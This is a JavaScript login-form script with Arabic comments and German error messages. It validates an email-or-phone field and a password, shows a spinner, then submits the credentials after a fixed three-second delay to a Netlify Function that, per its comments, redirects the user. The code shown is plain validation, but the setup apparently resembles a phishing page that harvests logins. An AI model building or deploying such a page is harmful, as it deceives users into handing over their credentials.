/* --- login.js --- */
document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailGroup = document.getElementById('emailGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    const emailWrapper = emailInput.parentElement;
    const passwordWrapper = passwordInput.parentElement;
    const form = document.getElementById('loginForm');
    const btnNext = document.getElementById('btnNext');

    // 1. دالة التحقق المتقدمة (Email ODER Phone)
    function isValidEmailOrPhone(input) {
        // Regex بسيط للبريد الإلكتروني
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        // Regex بسيط لرقم الهاتف (يسمح بالأرقام، المسافات، والرمز +)
        const phoneRegex = /^\+?[\d\s\-\(\)]{8,}$/;
        
        return emailRegex.test(input) || phoneRegex.test(input);
    }
    
    // 2. منطق الحقول العائمة (Floating Labels)
    const inputFields = [
        {input: emailInput, wrapper: emailWrapper, group: emailGroup}, 
        {input: passwordInput, wrapper: passwordWrapper, group: passwordGroup}
    ];

    function updateLabelState(input, wrapper) {
        if (input.value.trim() !== '') {
            wrapper.classList.add('has-value');
        } else {
            wrapper.classList.remove('has-value');
        }
    }

    // تطبيق السلوك على كلا الحقلين
    inputFields.forEach(({input, wrapper, group}) => {
        
        input.addEventListener('focus', () => {
            wrapper.classList.add('focused', 'has-value');
        });

        input.addEventListener('blur', () => {
            wrapper.classList.remove('focused');
            updateLabelState(input, wrapper);
        });
        
        input.addEventListener('input', () => {
            // إزالة أخطاء الحقل عند الكتابة
            group.classList.remove('error');
            wrapper.classList.remove('error');
            group.querySelector('.error-text').textContent = 'Erforderlich'; // إعادة نص الخطأ الافتراضي
            updateLabelState(input, wrapper);
        });

        setTimeout(() => updateLabelState(input, wrapper), 100);
    });


    // 3. منطق التحقق والإرسال
    form.addEventListener('submit', function(e) {
        // لا نحتاج لمنع التحويل بعد التحقق، سيتم إرسال البيانات إلى دالة Netlify
        // e.preventDefault(); 
        
        const emailVal = emailInput.value.trim();
        const passVal = passwordInput.value.trim();
        let hasError = false;

        // التحقق من حقل الإيميل/الهاتف
        if (!emailVal) {
            emailGroup.classList.add('error');
            emailGroup.querySelector('.error-text').textContent = 'Erforderlich';
            hasError = true;
        } else if (!isValidEmailOrPhone(emailVal)) {
            emailGroup.classList.add('error');
            emailGroup.querySelector('.error-text').textContent = 'Ungültige E-Mail- oder Telefonnummer.';
            hasError = true;
        } else {
            emailGroup.classList.remove('error');
        }

        // التحقق من حقل كلمة المرور
        if (!passVal) {
            passwordGroup.classList.add('error');
            hasError = true;
        } else {
            passwordGroup.classList.remove('error');
        }
        
        if (hasError) {
            e.preventDefault(); // نوقف الإرسال إذا كان هناك خطأ
            return; 
        }
        
        // 4. بدء التحميل والإرسال
        btnNext.classList.add('loading');

        // نترك النموذج يُرسل بعد تشغيل الـ Spinner
        // يجب أن نلغي الـ timeout هنا لأن دالة Netlify هي من ستقوم بالتحويل
        
        // لا نستخدم setTimeout هنا لأن النموذج يجب أن يُرسل فوراً إلى Netlify Function
        // وإلا قد يُلغي المتصفح الإرسال.
        
        // إذا كنت تريد محاكاة الـ 3 ثواني، يجب إضافة:
        // e.preventDefault();
        // ثم استخدام setTimeout وإرسال النموذج داخله:
        
        /* e.preventDefault();
        setTimeout(() => {
            form.submit(); // إرسال النموذج إلى المعالج
        }, 3000); 
        */
        
        // **لأغراض Netlify Functions، سنعتمد على أن الدالة تعمل بسرعة:**
        // لذلك، سنزيل الـ setTimeout من login.js ونجعل النموذج يرسل مباشرة إذا كان التحقق صحيحاً.
        
        // بما أن كودك الأصلي كان فيه setTimeout، سنقوم بتطبيق الأسلوب الأفضل لدوال Netlify:
        e.preventDefault(); // نوقف الإرسال المباشر
        
        // عرض التحميل لمدة قصيرة ثم الإرسال
        setTimeout(() => {
            form.submit(); // إرسال النموذج إلى دالة Netlify
        }, 3000); 
    });
});
